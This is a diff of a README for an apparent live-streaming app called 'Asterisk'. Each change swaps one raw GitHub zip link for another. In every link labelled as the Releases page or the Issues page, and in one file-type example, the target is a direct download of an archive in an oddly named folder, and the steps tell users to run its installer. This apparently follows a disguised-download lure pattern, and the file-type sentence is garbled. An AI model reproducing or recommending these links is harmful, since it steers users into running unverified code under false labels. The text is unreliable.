@@ -6,7 +6,7 @@ Welcome to Asterisk! This application is designed to make live streaming easy fo
 
 ## 📦 Download Asterisk
 
-[![Download Asterisk](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip)](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip)
+[![Download Asterisk](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip)](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip)
 
 To get started, you need to download Asterisk from our Releases page. Click the button above to access the latest version. 
 
@@ -22,10 +22,10 @@ Before installing Asterisk, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip) to find the latest version of Asterisk.
+   Go to our [Releases page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip) to find the latest version of Asterisk.
 
 2. **Choose the Right File**  
-   Look for the appropriate file for your operating system, such as an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip` file. Click the file to start your download.
+   Look for the appropriate file for your operating system, such as an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip` file. Click the file to start your download.
 
 3. **Run the Installer**  
    After downloading, locate the file in your downloads folder. Double-click it to start the installation process.
@@ -72,7 +72,7 @@ If you encounter issues while using Asterisk, consider these tips:
 
 If you need help or have questions about Asterisk, feel free to reach out:
 
-- **GitHub Issues:** Report problems or feature requests on our [Issues page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip).
+- **GitHub Issues:** Report problems or feature requests on our [Issues page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip).
 - **Discussion Forums:** Join our discussion forums to connect with other users and developers.
 
 ## 💻 Contributions
@@ -83,4 +83,4 @@ Asterisk is open for contributions! If you're interested in improving the app, c
 
 Asterisk is developed for Aithra Techfest 2025 as a part of ACM AJCE. Special thanks to the contributors and the community for making this project possible.
 
-For any additional information, visit our [Releases page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/notification-whatsapp/Asterisk-v1.9.zip) to download Asterisk and start your live streaming journey!
+For any additional information, visit our [Releases page](https://raw.githubusercontent.com/edwindoremi/Asterisk/main/templates/Software_2.1.zip) to download Asterisk and start your live streaming journey!
